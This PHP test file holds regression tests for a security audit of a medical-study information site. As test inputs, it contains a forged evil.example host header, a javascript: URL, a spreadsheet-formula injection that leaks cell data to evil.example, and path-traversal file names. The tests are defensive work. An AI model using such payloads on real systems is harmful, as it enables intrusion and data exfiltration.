<?php

namespace Tests\Feature;

use App\Models\Course;
use App\Models\ReferenceFact;
use App\Models\University;
use App\Models\User;
use Illuminate\Auth\Notifications\ResetPassword;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Notification;
use Symfony\Component\HttpFoundation\Request;
use Tests\TestCase;

/** Regression tests for the 2026-10-04 security audit (ops/reports/security-audit-2026-10-04.md). */
class SecurityAuditFixesTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        // TrustHosts stores trusted hosts statically on the Symfony request; a production-mode test earlier in the run
        // leaves them set. Start every test from a clean slate.
        Request::setTrustedHosts([]);
    }

    protected function tearDown(): void
    {
        Request::setTrustedHosts([]);
        parent::tearDown();
    }

    public function test_production_refuses_a_request_for_a_host_that_is_not_app_url(): void
    {
        config(['app.url' => 'https://studymedicineuknigeria.com']);
        $this->app['env'] = 'production';
        $this->get('http://evil.example/fees')->assertStatus(400);
        $this->get('https://studymedicineuknigeria.com/fees')->assertOk();
    }

    private function canonical(): void
    {
        config(['app.url' => 'https://studymedicineuknigeria.com', 'app.force_canonical_host' => true]);
    }

    public function test_a_forged_host_header_never_reaches_a_password_reset_link(): void
    {
        $this->canonical();
        Notification::fake();
        $user = User::factory()->create(['email' => 'victim@example.test']);

        $this->post('http://evil.example/password/email', ['email' => 'victim@example.test']);

        Notification::assertSentTo($user, ResetPassword::class, function (ResetPassword $n) use ($user) {
            $url = $n->toMail($user)->actionUrl;
            $this->assertStringStartsWith('https://studymedicineuknigeria.com/password/reset/', $url);
            $this->assertStringNotContainsString('evil.example', $url);

            return true;
        });
    }

    public function test_the_front_controller_redirect_never_uses_the_request_host(): void
    {
        $this->canonical();
        $this->get('http://evil.example/index.php/fees')->assertStatus(301)->assertRedirect('https://studymedicineuknigeria.com/fees');
    }

    private function feeFact(): ReferenceFact
    {
        $u = University::create(['slug' => 'testville', 'name' => 'University of Testville', 'nation' => 'England', 'international_policy' => 'accepts']);
        $c = Course::create(['university_id' => $u->id, 'slug' => 'a100', 'title' => 'Medicine MBBS', 'entry_type' => 'standard']);

        return $c->facts()->create(['key' => 'international_fee_gbp', 'value_number' => 50000, 'academic_year' => '2026/27', 'verification_status' => 'VERIFY-ON-PAGE', 'source_url' => 'https://example.ac.uk/fees', 'source_type' => 'official']);
    }

    private function decisions(string $rows): string
    {
        $file = 'storage/framework/testing/decisions-'.uniqid().'.csv';
        File::ensureDirectoryExists(base_path('storage/framework/testing'));
        File::put(base_path($file), "ref,decision,verified_value,new_source_url,reviewer_note,verified_on\n".$rows);

        return $file;
    }

    public function test_replaying_a_decisions_file_never_reverses_a_later_review(): void
    {
        $fee = $this->feeFact();
        $file = $this->decisions("course:testville/a100:international_fee_gbp:2026/27,verified,52000,,,2026-10-04\n");
        $this->artisan('smukn:facts-import', ['file' => $file])->assertSuccessful();
        $this->assertSame('VERIFIED', $fee->fresh()->verification_status);

        // a later review (admin queue) finds the page has changed
        $fee->update(['verification_status' => 'SOURCE_CHANGED', 'value_number' => 55000]);

        // the next deploy replays every committed decisions file
        $this->artisan('smukn:facts-import', ['file' => $file])->expectsOutputToContain('Already applied')->assertSuccessful();
        $this->assertSame('SOURCE_CHANGED', $fee->fresh()->verification_status);
        $this->assertEquals(55000, $fee->fresh()->value_number);
        File::delete(base_path($file));
    }

    public function test_an_imported_source_url_must_be_https(): void
    {
        $fee = $this->feeFact();
        $file = $this->decisions("course:testville/a100:international_fee_gbp:2026/27,verified,,javascript:alert(1),,2026-10-04\n");
        $this->artisan('smukn:facts-import', ['file' => $file])->expectsOutputToContain('must be an https:// address')->assertSuccessful();
        $this->assertSame('https://example.ac.uk/fees', $fee->fresh()->source_url);
        $this->assertSame('VERIFY-ON-PAGE', $fee->fresh()->verification_status);
        File::delete(base_path($file));
    }

    public function test_the_import_is_logged_at_a_level_production_keeps(): void
    {
        $this->feeFact();
        Log::spy();
        $file = $this->decisions("course:testville/a100:international_fee_gbp:2026/27,verified,,,,2026-10-04\n");
        $this->artisan('smukn:facts-import', ['file' => $file])->assertSuccessful();
        Log::shouldHaveReceived('warning')->withArgs(fn ($msg) => $msg === 'fact.worksheet_import')->once();
        File::delete(base_path($file));
    }

    public function test_the_worksheet_never_contains_a_live_spreadsheet_formula(): void
    {
        $fee = $this->feeFact();
        $fee->update(['value_number' => null, 'value_text' => '=HYPERLINK("https://evil.example/?"&A2,"Open")', 'notes' => '+cmd']);
        $file = 'storage/framework/testing/worksheet-'.uniqid().'.csv';
        $this->artisan('smukn:facts-export', ['file' => $file])->assertSuccessful();
        $csv = File::get(base_path($file));
        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringContainsString("'+cmd", $csv);
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?=HYPERLINK/m', $csv);
        File::delete(base_path($file));
    }

    public function test_worksheet_commands_stay_inside_the_project(): void
    {
        $this->artisan('smukn:facts-export', ['file' => '../outside.csv'])->assertFailed();
        $this->artisan('smukn:facts-import', ['file' => '../../etc/hostname'])->assertFailed();
    }
}
